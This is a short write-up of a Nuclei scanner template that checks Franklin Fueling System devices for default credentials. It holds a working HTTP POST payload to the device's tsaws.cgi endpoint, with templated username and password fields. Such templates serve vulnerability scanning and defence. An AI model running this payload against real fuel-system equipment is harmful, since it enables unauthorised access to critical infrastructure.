# Nuclei Template: Franklin Fueling System - Default Login
**Template ID:** franklin-fueling-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`franklin-fueling-default-login.yaml`)

## Vulnerability Information & PoC

## Description
A default password vulnerability refers to a security flaw that arises when a system or device is shipped or set up with a pre-configured, default password that is commonly known or easily guessable.

## Steps to reproduce / Exploit Payload
```http
POST /21408623/cgi-bin/tsaws.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<TSA_REQUEST_LIST PASSWORD="{{password}}"><TSA_REQUEST COMMAND="cmdWebCheckRole" ROLE="{{username}}"/></TSA_REQUEST_LIST>
```

## References
- https://www.exploitalert.com/view-details.html?id=39466
